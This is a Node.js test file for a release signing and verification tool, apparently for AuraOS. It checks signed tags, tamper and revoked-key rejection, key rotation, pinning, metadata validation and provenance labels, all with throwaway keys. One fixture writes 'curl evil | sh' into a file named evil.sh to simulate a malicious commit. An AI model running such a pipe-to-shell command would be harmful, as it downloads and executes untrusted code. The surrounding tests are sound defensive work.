// D71 (Phase 6 stream S): release metadata, signatures, key rotation and
// provenance. Throwaway keys only; the maintainer's real key never exists here.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { CUT, ROOT, SIGN, V, commitAll, git, makeRepo, rawTag, release, throwawayKey, tmp, trustOf, write } from './release-fixtures.mjs';

const code = (fn) => { try { fn(); } catch (e) { return e.code; } return 'ok'; };

test('keys: Ed25519 PEM only; key id = 16 hex of sha256(raw), fingerprint = 64', () => {
  const k = throwawayKey();
  assert.match(k.keyId, /^[0-9a-f]{16}$/);
  assert.equal(k.fingerprint.slice(0, 16), k.keyId);
  assert.equal(code(() => V.parsePublicKey('nope')), 'bad-key');
  const rsa = execFileSync('openssl', ['genpkey', '-algorithm', 'RSA', '-pkeyopt', 'rsa_keygen_bits:1024'], { stdio: ['ignore', 'pipe', 'ignore'] });
  const rsaPub = execFileSync('openssl', ['pkey', '-pubout'], { input: rsa }).toString();
  assert.equal(code(() => V.parsePublicKey(rsaPub)), 'bad-key');
});

test('a signed release verifies and is upstream-signed', () => {
  const k = throwawayKey();
  const dir = makeRepo();
  const r = release(dir, '0.1.0', k);
  const v = V.verifyTag(dir, 'v0.1.0', trustOf(k), { maturity: 'stable' });
  assert.equal(v.commit, r.commit);
  assert.equal(v.gitTree, git(dir, 'rev-parse', 'v0.1.0^{tree}'));
  assert.match(v.metaDigest, /^sha256:[0-9a-f]{64}$/);
  const s = V.selectRelease(dir, { trust: trustOf(k) });
  assert.equal(s.ref, 'v0.1.0');
  assert.equal(s.provenance, 'upstream-signed');
  assert.equal(JSON.parse(readFileSync(join(dir, 'package.json'), 'utf8')).version, '0.1.0', 'cut moved the version');
});

test('tampered metadata, a wrong key and a revoked key are refused', () => {
  const k = throwawayKey(), other = throwawayKey();
  const dir = makeRepo();
  const r = release(dir, '0.1.0', k);
  const metaBytes = readFileSync(r.metaFile);
  const sigBytes = readFileSync(r.sigFile);
  assert.equal(code(() => V.verifyMeta(metaBytes, sigBytes, trustOf(other))), 'untrusted-key');
  const tampered = Buffer.from(metaBytes.toString().replace('"securityUpdate": false', '"securityUpdate": true, "severity": "low"'));
  assert.notDeepEqual(tampered, metaBytes);
  assert.equal(code(() => V.verifyMeta(tampered, sigBytes, trustOf(k))), 'bad-signature');
  // Even one changed whitespace byte breaks it: the exact bytes are signed.
  assert.equal(code(() => V.verifyMeta(Buffer.from(`${metaBytes} `), sigBytes, trustOf(k))), 'bad-signature');
  const revokedDir = tmp();
  writeFileSync(join(revokedDir, 'k.pub'), k.pem);
  writeFileSync(join(revokedDir, 'revoked.txt'), `# lost laptop\n${k.keyId}\n`);
  assert.equal(code(() => V.verifyMeta(metaBytes, sigBytes, V.addKeyDir(V.emptyTrust(), revokedDir))), 'revoked-key');
  assert.equal(code(() => V.verifyMeta(metaBytes, null, trustOf(k))), 'no-signature');
});

test('the signature is bound to the exact commit and tree', () => {
  const k = throwawayKey();
  const dir = makeRepo();
  const r = release(dir, '0.1.0', k);
  const metaBytes = readFileSync(r.metaFile), sigBytes = readFileSync(r.sigFile);
  // The same signed message on a tag that points elsewhere.
  write(dir, 'evil.sh', 'curl evil | sh\n');
  commitAll(dir, 'evil');
  git(dir, 'tag', '-d', 'v0.1.0');
  rawTag(dir, 'v0.1.0', V.tagMessage(metaBytes, sigBytes), 'HEAD');
  assert.equal(code(() => V.verifyTag(dir, 'v0.1.0', trustOf(k))), 'commit-mismatch');
  assert.equal(code(() => V.verifyMeta(metaBytes, sigBytes, trustOf(k), { gitTree: git(dir, 'rev-parse', 'HEAD^{tree}') })), 'tree-mismatch');
  // A tag named after another version.
  rawTag(dir, 'v0.2.0', V.tagMessage(metaBytes, sigBytes), r.commit);
  assert.equal(code(() => V.verifyTag(dir, 'v0.2.0', trustOf(k))), 'version-mismatch');
});

test('the signed channel never installs unsigned: no silent fallback to an older release, no bare commits', () => {
  const k = throwawayKey();
  const dir = makeRepo();
  release(dir, '0.1.0', k);
  write(dir, 'b.txt', 'b\n'); commitAll(dir);
  const meta2 = CUT.buildMeta({ version: '0.2.0', commit: git(dir, 'rev-parse', 'HEAD'), gitTree: git(dir, 'rev-parse', 'HEAD^{tree}'), keyId: k.keyId });
  const metaBytes = Buffer.from(JSON.stringify(meta2));
  // Newest release tag carries metadata but no signature.
  rawTag(dir, 'v0.2.0', `AuraOS 0.2.0\n\n${V.armor(V.ARMOR_META, metaBytes)}`);
  assert.equal(code(() => V.selectRelease(dir, { trust: trustOf(k) })), 'no-signature', 'must not fall back to v0.1.0');
  // A tag without release metadata is not a release (ignored), lightweight tags too.
  git(dir, 'tag', 'v9.9.9');
  assert.equal(code(() => V.selectRelease(dir, { trust: trustOf(k) })), 'no-signature');
  assert.equal(V.selectRelease(dir, { trust: trustOf(k), ref: 'v0.1.0' }).ref, 'v0.1.0', 'an older release only when named');
  assert.equal(code(() => V.selectRelease(dir, { trust: trustOf(k), ref: git(dir, 'rev-parse', 'HEAD') })), 'no-signature');
  assert.equal(code(() => V.selectRelease(makeRepo(), { trust: trustOf(k) })), 'no-release');
});

test('maturity is a signed label apart from trust: every maturity is a signed tag, a floor selects', () => {
  const k = throwawayKey();
  const dir = makeRepo();
  const a = release(dir, '0.1.0-alpha.1', k);
  assert.equal(a.meta.maturity, 'alpha');
  assert.match(git(dir, 'cat-file', 'tag', 'v0.1.0-alpha.1'), /AuraOS 0\.1\.0-alpha\.1 \(alpha, signed\)/);
  let s = V.selectRelease(dir, { trust: trustOf(k) });
  assert.deepEqual([s.ref, s.maturity, s.provenance], ['v0.1.0-alpha.1', 'alpha', 'upstream-signed'], 'the first alpha is a signed release');
  write(dir, 'b.txt', 'b\n'); commitAll(dir);
  release(dir, '0.1.0-beta.1', k);
  assert.equal(V.selectRelease(dir, { trust: trustOf(k) }).ref, 'v0.1.0-beta.1');
  assert.equal(V.selectRelease(dir, { trust: trustOf(k), maturity: 'beta' }).ref, 'v0.1.0-beta.1');
  assert.throws(() => V.selectRelease(dir, { trust: trustOf(k), maturity: 'stable' }), (e) => e.code === 'no-release' && /newest: v0\.1\.0-beta\.1/.test(e.message));
  assert.equal(V.selectRelease(dir, { trust: trustOf(k), maturity: 'stable', ref: 'v0.1.0-alpha.1' }).maturity, 'alpha', 'a named release is an explicit choice');
  write(dir, 'c.txt', 'c\n'); commitAll(dir);
  release(dir, '0.1.0', k);
  s = V.selectRelease(dir, { trust: trustOf(k), maturity: 'stable' });
  assert.deepEqual([s.ref, s.maturity], ['v0.1.0', 'stable']);
  assert.equal(V.selectRelease(dir, { trust: trustOf(k) }).ref, 'v0.1.0', 'alpha floor: the newest of any maturity');
  // The label is bound to the version: a "stable" label on an alpha version cannot be signed into existence.
  const meta = JSON.parse(readFileSync(a.metaFile, 'utf8'));
  assert.equal(code(() => V.validateMeta({ ...meta, maturity: 'stable' })), 'malformed');
  assert.equal(code(() => CUT.cut({ repo: dir, version: '0.2.0-dev.1', keyId: k.keyId, out: tmp() })), 'usage');
  assert.equal(V.maturityOfVersion('1.0.0-rc.2'), 'beta');
  assert.equal(V.meetsMaturity('alpha', 'beta'), false);
});

test('main channel: unsigned, upstream-unsigned, opt-in only', () => {
  const dir = makeRepo();
  const s = V.selectRelease(dir, { channel: 'main', trust: V.emptyTrust() });
  assert.equal(s.signed, false);
  assert.equal(s.provenance, 'upstream-unsigned');
  assert.equal(s.commit, git(dir, 'rev-parse', 'main'));
  assert.equal(V.showsAsSigned(s.provenance), false);
  assert.equal(code(() => V.selectRelease(dir, { channel: 'stable', trust: V.emptyTrust() })), 'malformed', 'the trust channel is signed|main; stable is a maturity');
});

test('rotation: a verified release introduces its successor key; a candidate never trusts itself', () => {
  const k1 = throwawayKey(), k2 = throwawayKey(), evil = throwawayKey();
  const dir = makeRepo([k1]);
  write(dir, `os/release-keys/${k2.keyId}.pub`, k2.pem); commitAll(dir, 'introduce k2');
  release(dir, '0.1.0', k1);
  write(dir, 'c.txt', 'c\n'); commitAll(dir);
  release(dir, '0.2.0', k2);
  const s = V.selectRelease(dir, { trust: trustOf(k1) });
  assert.equal(s.ref, 'v0.2.0');
  assert.equal(s.keyId, k2.keyId);
  assert.deepEqual(s.chain.map((c) => c.tag), ['v0.1.0']);
  // A release whose own tree adds the key that signs it.
  write(dir, `os/release-keys/${evil.keyId}.pub`, evil.pem); commitAll(dir, 'self-introduced');
  release(dir, '0.3.0', evil, { raw: true });
  assert.equal(code(() => V.selectRelease(dir, { trust: trustOf(k1) })), 'untrusted-key');
});

test('rotation: a verified release revokes a key; later releases signed with it are refused', () => {
  const k1 = throwawayKey(), k2 = throwawayKey();
  const dir = makeRepo([k1, k2]);
  release(dir, '0.1.0', k1);
  write(dir, 'os/release-keys/revoked.txt', `${k1.keyId}\n`); commitAll(dir, 'revoke k1');
  release(dir, '0.2.0', k2);
  write(dir, 'd.txt', 'd\n'); commitAll(dir);
  release(dir, '0.3.0', k1, { raw: true });
  // The running release (0.2.0) is the trust: its keys and revocations.
  const running = V.extendTrust(V.emptyTrust(), V.readTreeKeys(dir, git(dir, 'rev-parse', 'v0.2.0^{commit}')));
  assert.equal(code(() => V.verifyTag(dir, 'v0.3.0', running)), 'revoked-key');
  assert.equal(V.verifyTag(dir, 'v0.2.0', running).keyId, k2.keyId);
});

test('pinning keeps only the pinned keys and refuses an unknown pin', () => {
  const k1 = throwawayKey(), k2 = throwawayKey();
  const t = V.pinTrust(trustOf(k1, k2), [k2.fingerprint.toUpperCase().replace(/(.{4})/g, '$1:')]);
  assert.deepEqual([...t.keys.keys()], [k2.keyId]);
  assert.equal(code(() => V.pinTrust(trustOf(k1), [k2.keyId])), 'untrusted-key');
});

test('metadata schema: unknown fields, a newer version and missing severity are refused', () => {
  const base = { v: 1, product: 'auraos', version: '1.0.0', commit: 'a'.repeat(40), gitTree: 'b'.repeat(40), maturity: 'stable', publishedAt: '2026-11-27T00:00:00Z', securityUpdate: false, keyId: '0123456789abcdef' };
  assert.doesNotThrow(() => V.validateMeta(base));
  for (const bad of [{ ...base, extra: 1 }, { ...base, v: 2 }, { ...base, securityUpdate: true }, { ...base, gitTree: 'b'.repeat(64) },
    { ...base, maturity: 'nightly' }, { ...base, channel: 'stable' }, { ...base, version: '1.0.0-alpha.1' }, { ...base, version: '1.0.0-dev.1', maturity: 'alpha' }, { ...base, version: 'v1.0.0' }, { ...base, advisories: ['bad id with spaces'] }, { ...base, product: 'other' }]) {
    assert.equal(code(() => V.validateMeta(bad)), 'malformed', JSON.stringify(bad));
  }
  assert.doesNotThrow(() => V.validateMeta({ ...base, securityUpdate: true, severity: 'critical', advisories: ['AURA-2026-001', 'CVE-2026-1234'], supersedes: ['0.9.0'], minFrom: '0.5.0' }));
});

test('provenance: locally modified is never shown as signed', () => {
  assert.equal(V.provenanceOf({ channel: 'signed', signed: true }), 'upstream-signed');
  assert.equal(V.provenanceOf({ channel: 'signed', signed: true, seriesLength: 2 }), 'locally-modified');
  assert.equal(V.provenanceOf({ channel: 'signed', signed: true, developerCheckout: true }), 'locally-modified');
  assert.equal(V.provenanceOf({ channel: 'main', signed: true }), 'upstream-unsigned');
  assert.equal(V.provenanceOf({ channel: 'signed', signed: false }), 'upstream-unsigned');
  const label = V.provenanceLabel({ provenance: 'locally-modified', baseVersion: '0.1.0', patches: 2 });
  assert.match(label, /based on 0\.1\.0, locally modified \(2 patches\); not a signed release/);
  assert.equal(V.showsAsSigned('locally-modified'), false);
  assert.match(V.provenanceLabel({ provenance: 'upstream-signed', version: '0.1.0' }), /signed upstream release/);
});

test('gitTreeOfDir: a git archive extraction hashes to the commit tree (modes, symlinks, ordering)', () => {
  const dir = makeRepo();
  for (const f of ['a', 'a.b', 'a-b', 'a/x', 'a/b/c', 'z/empty-sibling/f', 'ü.txt']) write(dir, f === 'a' ? 'a0' : f, `${f}\n`);
  write(dir, 'bin/run', '#!/bin/sh\n'); chmodSync(join(dir, 'bin/run'), 0o755);
  symlinkSync('../README.md', join(dir, 'bin/readme'));
  commitAll(dir);
  const out = tmp();
  execFileSync('sh', ['-c', `git -C "${dir}" archive HEAD | tar -x -C "${out}"`]);
  mkdirSync(join(out, 'empty-dir/nested'), { recursive: true });
  assert.equal(V.gitTreeOfDir(out), git(dir, 'rev-parse', 'HEAD^{tree}'));
  writeFileSync(join(out, 'a/x'), 'changed\n');
  assert.notEqual(V.gitTreeOfDir(out), git(dir, 'rev-parse', 'HEAD^{tree}'));
});

test('cut: refuses dirty trees, output inside the checkout and downgrades; keeps package.json formatting', () => {
  const k = throwawayKey();
  const dir = makeRepo();
  // A failing hook proves cut bypasses the legacy bump hooks.
  write(dir, '.hooks/pre-commit', '#!/bin/sh\nexit 1\n'); chmodSync(join(dir, '.hooks/pre-commit'), 0o755);
  commitAll(dir, 'hooks');
  git(dir, 'config', 'core.hooksPath', '.hooks');
  write(dir, 'dirty', 'x');
  assert.equal(code(() => CUT.cut({ repo: dir, version: '0.1.0', keyId: k.keyId, out: tmp() })), 'dirty');
  git(dir, 'clean', '-fq');
  assert.equal(code(() => CUT.cut({ repo: dir, version: '0.1.0', keyId: k.keyId, out: join(dir, 'rel') })), 'out-in-repo');
  assert.equal(code(() => CUT.cut({ repo: dir, version: '0.0.1', keyId: k.keyId, out: tmp() })), 'downgrade');
  git(dir, 'checkout', '-qb', 'feature');
  assert.equal(code(() => CUT.cut({ repo: dir, version: '0.1.0', keyId: k.keyId, out: tmp() })), 'branch');
  git(dir, 'checkout', '-q', 'main');
  const r = CUT.cut({ repo: dir, version: '0.1.0', keyId: k.keyId, out: tmp() });
  assert.equal(readFileSync(join(dir, 'package.json'), 'utf8'), '{\n  "name": "aura",\n  "version": "0.1.0",\n  "private": true\n}\n');
  assert.equal(git(dir, 'log', '-1', '--format=%s'), 'release: v0.1.0');
  assert.equal(r.meta.gitTree, git(dir, 'rev-parse', 'HEAD^{tree}'));
  assert.equal(git(dir, 'status', '--porcelain'), '');
});

test('sign: refuses inside AuraOS, keys inside a checkout and group-readable keys', () => {
  assert.match(SIGN.insideAuraReason({ OS_API_BASE: 'http://x' }, () => false), /OS_API_BASE/);
  assert.match(SIGN.insideAuraReason({}, (p) => p === '/data/aura'), /data directory/);
  assert.equal(SIGN.insideAuraReason({}, () => false), null);
  const k = throwawayKey();
  const outside = tmp();
  const keyFile = join(outside, 'release.pem');
  writeFileSync(keyFile, k.privateKey.export({ type: 'pkcs8', format: 'pem' }), { mode: 0o644 });
  chmodSync(keyFile, 0o644);
  assert.equal(code(() => SIGN.checkKeyFile(keyFile)), 'key-mode');
  chmodSync(keyFile, 0o600);
  assert.equal(code(() => SIGN.checkKeyFile(keyFile)), 'ok');
  const repo = makeRepo();
  const inRepo = join(repo, 'release.pem');
  writeFileSync(inRepo, 'x', { mode: 0o600 });
  assert.equal(code(() => SIGN.checkKeyFile(inRepo)), 'key-in-repo');
  // The CLI inside AuraOS (this test runs in the master container, or set the marker).
  const r = spawnSync(process.execPath, [join(ROOT, 'tools/release/sign.mjs'), '--key', keyFile, '--meta', '/nonexistent'],
    { env: { ...process.env, OS_API_BASE: 'http://aura-shell:3000' }, encoding: 'utf8' });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /inside AuraOS/);
  // A key that does not match the metadata's keyId.
  const other = throwawayKey();
  const meta = Buffer.from(JSON.stringify(CUT.buildMeta({ version: '1.0.0', commit: 'a'.repeat(40), gitTree: 'b'.repeat(40), keyId: other.keyId })));
  assert.equal(code(() => SIGN.signMetaBytes(meta, k.privateKey)), 'key-mismatch');
});

test('verifier CLI: JSON result and exit codes', () => {
  const k = throwawayKey();
  const dir = makeRepo();
  release(dir, '0.1.0', k);
  const keys = tmp();
  writeFileSync(join(keys, 'k.pub'), k.pem);
  const run = (...args) => spawnSync(process.execPath, [join(ROOT, 'os/release-verify.mjs'), ...args], { encoding: 'utf8' });
  let r = run('tag', '--repo', dir, '--tag', 'v0.1.0', '--keys', keys);
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.equal(JSON.parse(r.stdout).provenance, 'upstream-signed');
  r = run('select', '--repo', dir, '--keys', tmp());
  assert.equal(r.status, 1);
  assert.equal(JSON.parse(r.stdout).code, 'untrusted-key');
  assert.equal(run('nonsense').status, 64);
  r = run('fingerprint', join(keys, 'k.pub'));
  assert.equal(JSON.parse(r.stdout).keys[0].keyId, k.keyId);
});
